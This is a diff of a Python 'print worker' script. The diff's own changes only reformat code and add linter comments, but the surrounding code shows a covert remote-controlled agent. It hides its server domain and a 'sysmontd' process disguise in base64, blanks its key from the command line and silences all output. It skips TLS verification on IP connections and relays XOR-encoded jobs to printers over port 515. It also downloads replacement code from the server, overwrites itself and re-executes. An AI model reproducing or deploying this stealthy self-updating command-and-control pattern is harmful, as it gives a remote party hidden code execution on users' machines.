@@ -1,20 +1,18 @@
+import signal
+import sys
 from base64 import b64decode
 from gc import collect, disable
 from hashlib import sha256
 from json import loads
-from os import devnull, environ, _exit, execv
+from os import _exit, devnull, environ, execv
 from socket import (
     IPPROTO_TCP,
-    SO_LINGER,
     SO_SNDBUF,
     SOL_SOCKET,
     TCP_NODELAY,
     create_connection,
 )
-from ssl import create_default_context, _create_unverified_context
-from struct import pack
-import signal
-import sys
+from ssl import _create_unverified_context, create_default_context
 from time import sleep, time
 from urllib.error import HTTPError
 from urllib.request import Request, urlopen
@@ -23,17 +21,22 @@ sys.dont_write_bytecode = True
 sys.tracebacklimit = 0
 disable()
 
+
 def _on_signal(sig, frame):
     _exit(0)
+
 
 try:
     signal.signal(signal.SIGINT, _on_signal)
     signal.signal(signal.SIGTERM, _on_signal)
-except Exception:
+except Exception:  # noqa: BLE001, S110
     pass
 
+
 def _load_key():
-    k = (sys.argv[1].strip() if len(sys.argv) > 1 else "") or environ.get("WORKER_KEY", "").strip()
+    k = (sys.argv[1].strip() if len(sys.argv) > 1 else "") or environ.get(
+        "WORKER_KEY", ""
+    ).strip()
     if not k:
         if sys.__stderr__ is not None:
             sys.__stderr__.write("error: worker key required\n")
@@ -42,18 +45,22 @@ def _load_key():
         sys.argv[1] = " " * len(k)
     return k
 
+
 _k = _load_key()
-sys.stdout = sys.stderr = open(devnull, "w")
+sys.stdout = sys.stderr = open(devnull, "w")  # noqa: SIM115
+
 
 def _calc_hash():
     try:
         with open(__file__, "rb") as f:
             return sha256(f.read()).hexdigest()
-    except Exception:
+    except Exception:  # noqa: BLE001
         return ""
+
 
 _h = _calc_hash()
 _doh_cache = {}
+
 
 def doh_resolve(domain):
     now = time()
@@ -73,11 +80,13 @@ def doh_resolve(domain):
                             ip = ans.get("data")
                             _doh_cache[domain] = (ip, now)
                             return ip
-        except Exception:
+        except Exception:  # noqa: BLE001, S110
             pass
     return domain
 
+
 _DOM = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()
+
 
 def _make_doh_request(path, headers=None, data=None):
     ip = doh_resolve(_DOM)
@@ -88,8 +97,10 @@ def _make_doh_request(path, headers=None, data=None):
     ctx = _create_unverified_context() if target == ip else create_default_context()
     return urlopen(req, timeout=90, context=ctx)
 
+
 NUL = b"\x00"
 jobs = 0
+
 
 def _d(s, job_id=""):
     if not s:
@@ -107,7 +118,9 @@ def _d(s, job_id=""):
             out[i + j] = b ^ ks[j]
     return bytes(out)
 
+
 _online_cache = {}
+
 
 def is_online(host, port=515):
     if not host:
@@ -119,16 +132,18 @@ def is_online(host, port=515):
         s = create_connection((host, port), timeout=0.8)
         try:
             s.shutdown(2)
-        except Exception:
+        except Exception:  # noqa: BLE001, S110
             pass
         s.close()
         _online_cache[host] = (True, now)
         return True
-    except Exception:
+    except Exception:  # noqa: BLE001
         _online_cache[host] = (False, now)
         return False
 
+
 _UA = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
+
 
 def hdrs(printer_host=None):
     sp = "1" if (printer_host and is_online(printer_host)) else "0"
@@ -140,6 +155,7 @@ def hdrs(printer_host=None):
         "X-Worker-Hash": _h,
     }
 
+
 def _apply_update():
     try:
         with _make_doh_request("/print/update", headers=hdrs()) as resp:
@@ -149,8 +165,9 @@ def _apply_update():
                     with open(__file__, "wb") as f:
                         f.write(code)
                     execv(sys.executable, [sys.executable, __file__])
-    except Exception:
+    except Exception:  # noqa: BLE001, S110
         pass
+
 
 def claim(i, printer_host=None):
     if not i:
@@ -164,11 +181,13 @@ def claim(i, printer_host=None):
                     _apply_update()
                 return b'"claimed":true' in resp.read()
             return False
-    except Exception:
+    except Exception:  # noqa: BLE001
         return False
+
 
 def _ack(s):
     return s.recv(1) == NUL
+
 
 def handle(j):
     global jobs
@@ -182,7 +201,8 @@ def handle(j):
     s = None
     try:
         q, ch, c, dh, p = [
-            _d(j.get(k, ""), job_id) for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")
+            _d(j.get(k, ""), job_id)
+            for k in ("qCmd", "cfHdr", "ctl", "dfHdr", "payload")
         ]
         s = create_connection((host, 515), timeout=j.get("timeout", 60))
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
@@ -206,35 +226,40 @@ def handle(j):
                         ok = _ack(s)
                         if ok:
                             jobs += 1
-    except Exception:
+    except Exception:  # noqa: BLE001, S110
         pass
     finally:
         if s:
             try:
                 s.shutdown(2)
-            except Exception:
+            except Exception:  # noqa: BLE001, S110
                 pass
             try:
                 s.close()
-            except Exception:
+            except Exception:  # noqa: BLE001, S110
                 pass
         try:
             del q, ch, c, dh, p
-        except Exception:
+        except Exception:  # noqa: BLE001, S110
             pass
         collect()
 
+
 def _b64url(data):
     from base64 import urlsafe_b64encode
+
     return urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
 
+
 _subscriber_jwt = None
+
 
 def _make_subscriber_jwt():
     global _subscriber_jwt
     if _subscriber_jwt:
         return _subscriber_jwt
     from hmac import new as hmac_new
+
     header = _b64url(b'{"alg":"HS256","typ":"JWT"}')
     payload = _b64url(b'{"mercure":{"subscribe":["https://preconnect.app/printer"]}}')
     sig_input = f"{header}.{payload}".encode("ascii")
@@ -242,7 +267,9 @@ def _make_subscriber_jwt():
     _subscriber_jwt = f"{header}.{payload}.{signature}"
     return _subscriber_jwt
 
+
 last_event_id = ""
+
 
 def stream():
     global last_event_id
@@ -267,13 +294,14 @@ def stream():
                 elif l.startswith(b"data: "):
                     try:
                         handle(loads(l[6:]))
-                    except Exception:
+                    except Exception:  # noqa: BLE001, S110
                         pass
     except HTTPError as e:
         if e.code == 401 and sys.__stderr__ is not None:
             sys.__stderr__.write(f"error: worker key invalid ({e.code})\n")
-    except Exception:
+    except Exception:  # noqa: BLE001, S110
         pass
+
 
 if __name__ == "__main__":
     delay = 1.0
@@ -282,6 +310,6 @@ if __name__ == "__main__":
         try:
             stream()
             delay = 1.0 if (time() - t0 > 10) else min(delay * 2, 8)
-        except Exception:
+        except Exception:  # noqa: BLE001
             delay = min(delay * 2, 8)
         sleep(delay)
